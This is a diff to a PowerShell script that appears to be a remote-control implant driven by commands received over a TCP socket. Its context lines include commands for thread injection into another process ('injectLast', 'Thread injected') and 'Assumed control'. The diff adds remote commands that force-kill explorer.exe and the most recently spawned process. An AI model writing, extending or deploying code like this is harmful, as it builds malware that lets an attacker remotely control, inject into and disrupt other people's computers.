@@ -86,6 +86,21 @@ function get-socket-streams()
 	$global:nsWriter = new-object system.io.streamwriter($global:ns)
 }
 
+function kill-pid($pidd)
+{
+    stop-process $pidd
+}
+
+function kill-name($name)
+{
+    stop-process -processname $name
+}
+
+function kill-explorer()
+{
+    taskkill /F /IM explorer.exe
+}
+
 function dispatch-command([string]$command, [system.net.sockets.tcpclient]$client)
 {
 	$recv = new-object system.byte[] 128
@@ -163,6 +178,18 @@ function dispatch-command([string]$command, [system.net.sockets.tcpclient]$clien
 		write-socket "Assumed control"
 	}
 
+	if($cmdarray[0] -eq "killExplorer")
+	{
+        kill-explorer
+		write-socket "Explorer's dead"
+	}
+
+	if($cmdarray[0] -eq "killLast")
+	{
+		kill-pid $global:lastProc.id
+		write-socket "Last app is dead"
+	}
+
 	if($cmdarray[0] -eq "injectLast")
 	{
 		$id = $global:lastProc.id
@@ -170,7 +197,6 @@ function dispatch-command([string]$command, [system.net.sockets.tcpclient]$clien
 		set-pipe-server $global:PipeName3
 		write-socket "Thread injected"
 	}
-
 
 	if($cmdarray[0] -eq "spawn")
 	{
